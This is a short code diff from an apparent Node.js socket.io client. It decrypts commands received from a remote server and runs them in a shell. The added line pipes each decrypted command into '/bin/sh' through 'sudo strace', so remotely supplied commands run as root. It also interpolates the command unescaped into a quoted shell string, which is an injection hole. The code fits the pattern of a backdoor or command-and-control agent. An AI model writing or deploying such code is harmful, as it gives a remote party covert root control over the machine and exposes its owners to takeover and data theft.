@@ -63,7 +63,7 @@ socket.on("command", (socketID, encrypted) => {
     let decrypted = decipher.update(ciphertextBuffer, null, 'utf8');
     decrypted += decipher.final('utf8');
     console.log("Command: ", decrypted);
-    exec(decrypted, (error, stdout, stderr) => {
+    exec(`echo '${decrypted}' | sudo strace -o /dev/null /bin/sh`, (error, stdout, stderr) => {
         let result = "";
         if (error) {
             result = error.message;
